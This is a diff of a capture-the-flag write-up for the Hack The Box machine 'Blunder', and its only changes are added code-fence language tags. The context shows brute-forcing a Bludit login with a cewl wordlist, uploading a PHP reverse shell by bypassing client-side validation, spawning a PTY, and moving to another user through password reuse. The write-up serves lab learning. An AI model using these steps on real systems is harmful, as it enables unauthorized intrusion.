@@ -74,7 +74,7 @@ Attacker Machine: 10.10.14.16
 
 	I am failure by using the rockyou.txt as the password list to gain the website login access, but, it is success using [cewl](https://tools.kali.org/password-attacks/cewl) to gathering the wordlist from the site.
 
-	```
+	```python
 	#!/usr/bin/env python3
 	import re
 	import requests
@@ -114,7 +114,7 @@ Attacker Machine: 10.10.14.16
 				break
 	```
 
-	```
+	```shell
 	root@kclai:~/Documents/ctf/htb/linux/17-HTB-Blunder/exploit# cewl 10.10.10.191 > password.txt
 	root@kclai:~/Documents/ctf/htb/linux/17-HTB-Blunder/exploit# python3 exploit.py 
 	[*] Trying: CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
@@ -150,7 +150,7 @@ Attacker Machine: 10.10.14.16
 	
 	As the upload validation only applies on the client-side, thus, using the burp to change the upload parameters (value of filename), the PHP reverse shell and the **.htaccess** files are uploaded to the **/tmp/** folder. I can execute the reverse shell PHP by visiting the http://10.10.10.191/bl-content/tmp/reverse.php
 
-	```
+	```php
 	POST /admin/ajax/upload-images HTTP/1.1
 	Host: 10.10.10.191
 	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -211,7 +211,7 @@ Attacker Machine: 10.10.14.16
 
 	I find that Hugo reuse his password reuse on their system account. Let's spawn a PTY shell, as this will allow us to use the su command. The low privilege user account obtain.
 
-	```
+	```shell
 	www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ python -c "import pty;pty.spawn('/bin/bash');"
 	www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
 	su hugo
@@ -233,7 +233,7 @@ Attacker Machine: 10.10.14.16
 
 	![img](./img/16.png)
 
-	```
+	```shell
 	hugo@blunder:~$ 
 	hugo@blunder:~$ sudo -l
 	sudo -l
